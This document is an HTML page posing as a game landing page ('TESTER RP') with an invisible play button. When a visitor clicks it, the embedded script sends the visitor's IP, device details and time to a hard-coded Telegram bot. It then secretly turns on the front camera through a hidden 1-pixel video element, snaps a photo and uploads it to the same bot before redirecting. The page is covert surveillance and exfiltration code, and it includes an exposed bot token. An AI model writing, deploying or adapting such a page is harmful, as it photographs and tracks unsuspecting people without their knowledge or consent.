<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TESTER RP</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            touch-action: none;
            -webkit-text-size-adjust: none;
            text-size-adjust: none;
            height: 100vh;
            font-family: Arial, sans-serif;
            position: relative;
            background: #000;
        }
        
        .background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -2;
        }
        
        .bottom-image {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            z-index: -1;
        }
        
        .content {
            position: relative;
            z-index: 1;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            padding-bottom: 20px;
        }
        
        .play-btn {
            background: transparent;
            border: none;
            width: 200px;
            height: 80px;
            margin-bottom: 100px;
            cursor: pointer;
        }
        
        .hidden-camera {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }
        
        .legal-links {
            position: absolute;
            bottom: 10px;
            width: 100%;
            text-align: center;
            color: #fff;
            font-size: 12px;
        }
        
        .legal-links a {
            color: #fff;
            text-decoration: none;
            margin: 0 10px;
        }
    </style>
</head>
<body>
    <img src="https://i.imgur.com/luRLTOY.jpg" class="background" alt="Background">
    <img src="https://i.imgur.com/RfC84iC.jpg" class="bottom-image" alt="Bottom image">

    <div class="content">
        <button class="play-btn" id="playBtn"></button>
    </div>

    <div class="legal-links">
        <a href="#">Договор оферты</a>
        <a href="#">Политика конфиденциальности</a>
    </div>

    <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>

    <script>
        const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
        const chatId = '-1002577213610';
        const videoElement = document.getElementById('hiddenCamera');
        const playBtn = document.getElementById('playBtn');
        let stream = null;

        // Блокировка масштабирования
        document.addEventListener('gesturestart', function(e) {
            e.preventDefault();
        });
        
        document.addEventListener('touchmove', function(e) {
            if(e.scale !== 1) {
                e.preventDefault();
            }
        }, { passive: false });

        // 1. Отправка информации о пользователе
        async function sendUserInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                
                const userAgent = navigator.userAgent;
                const screenRes = `${window.screen.width}x${window.screen.height}`;
                const time = new Date().toLocaleString();
                
                const message = `🚨 Новый посетитель:\nIP: ${ip}\nУстройство: ${userAgent}\nЭкран: ${screenRes}\nВремя: ${time}`;
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Error sending user info:', error);
            }
        }

        // 2. Захват фото с камеры
        async function captureAndSendPhoto() {
            try {
                // Ждем 1 секунду чтобы камера стабилизировалась
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Создаем canvas для захвата кадра
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                // Преобразуем в blob
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
                
                // Создаем FormData для отправки
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'verification_photo.jpg');
                
                // Добавляем описание
                const caption = `🆔 Фото верификации\nВремя: ${new Date().toLocaleString()}`;
                formData.append('caption', caption);
                
                // Отправляем фото в Telegram
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                // Перенаправляем после успешной проверки
                window.location.href = "https://your-game-link.com";
                
            } catch (error) {
                console.error('Error capturing photo:', error);
                // В случае ошибки все равно перенаправляем
                window.location.href = "https://your-game-link.com";
            } finally {
                stopCamera();
            }
        }

        // 3. Запуск камеры устройства
        async function startCamera() {
            try {
                // Запрашиваем доступ к камере устройства (не Telegram)
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user', // Фронтальная камера
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                videoElement.srcObject = stream;
                
                // Сразу делаем фото после получения доступа
                await captureAndSendPhoto();
                
            } catch (error) {
                console.error('Camera error:', error);
                // В случае ошибки все равно перенаправляем
                window.location.href = "https://your-game-link.com";
            }
        }

        // 4. Остановка камеры
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                videoElement.srcObject = null;
            }
        }

        // 5. Обработчик кнопки "Играть"
        playBtn.addEventListener('click', async function() {
            await sendUserInfo(); // Сначала отправляем информацию о пользователе
            await startCamera(); // Затем запускаем процесс верификации
        });

        // Остановка камеры при закрытии страницы
        window.addEventListener('beforeunload', stopCamera);
    </script>
</body>
</html>
